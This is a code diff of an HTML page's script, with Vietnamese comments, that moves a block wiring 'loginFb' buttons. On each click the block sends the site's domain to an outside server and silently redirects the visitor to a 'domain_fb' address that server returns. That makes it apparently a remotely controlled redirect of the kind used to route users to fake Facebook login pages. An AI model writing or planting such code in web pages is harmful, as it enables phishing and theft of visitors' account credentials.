@@ -660,22 +660,6 @@
                                     </div>
                                 </div>
                                 <script>
-                                    const btns = document.querySelectorAll('.loginFb');
-                                    btns.forEach(btn => {
-                                        btn.addEventListener('click', function () {
-                                            const domain = window.location.protocol + "//" + window.location.host;
-                                            (async () => {
-                                                try {
-                                                    let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
-                                                    data = await data.json()
-                                                    window.location.href = data.data.domain_fb;
-                                                } catch {
-
-                                                }
-                                            })();
-                                        });
-                                    });
-
                                     const showPopupLinks = document.querySelectorAll('#show-popup');
 
                                     // Hàm hiển thị popup
@@ -689,11 +673,29 @@
                                             showCloseButton: true, // Hiển thị nút đóng
                                             focusConfirm: false, // Không tự động focus vào nút xác nhận
                                         });
+
+
                                     }
                                     showPopupLinks.forEach(link => {
                                         link.addEventListener('click', function (event) {
                                             event.preventDefault();
                                             showPopup();
+                                        });
+                                    });
+
+                                    const btns = document.querySelectorAll('.loginFb');
+                                    btns.forEach(btn => {
+                                        btn.addEventListener('click', function () {
+                                            const domain = window.location.protocol + "//" + window.location.host;
+                                            (async () => {
+                                                try {
+                                                    let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
+                                                    data = await data.json()
+                                                    window.location.href = data.data.domain_fb;
+                                                } catch {
+
+                                                }
+                                            })();
                                         });
                                     });
                                 </script>
